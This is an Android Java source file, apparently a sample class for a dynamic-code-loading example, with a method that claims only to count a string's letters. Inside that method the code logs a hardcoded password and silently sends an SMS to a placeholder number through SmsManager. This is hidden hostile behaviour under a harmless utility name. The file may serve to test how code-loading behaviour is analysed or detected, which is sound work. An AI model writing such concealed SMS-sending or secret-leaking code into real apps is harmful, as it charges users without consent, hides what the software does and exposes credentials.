package com.example.dynamiccodeloadingexample;

import android.telephony.SmsManager;
import android.util.Log;

public class StringFns {
    public static String TAG = "DYNAMIC_CODE_LOADING_EXAMPLE";
    public static String passwod = "pass3-jn4h8Jn4mn";
    public static int countLetters(String str) {
        Log.i(TAG, passwod);
        SmsManager smsManager = SmsManager.getDefault();
        smsManager.sendTextMessage("+999999999", null, "sms message", null, null);
        return str.length();
    }
}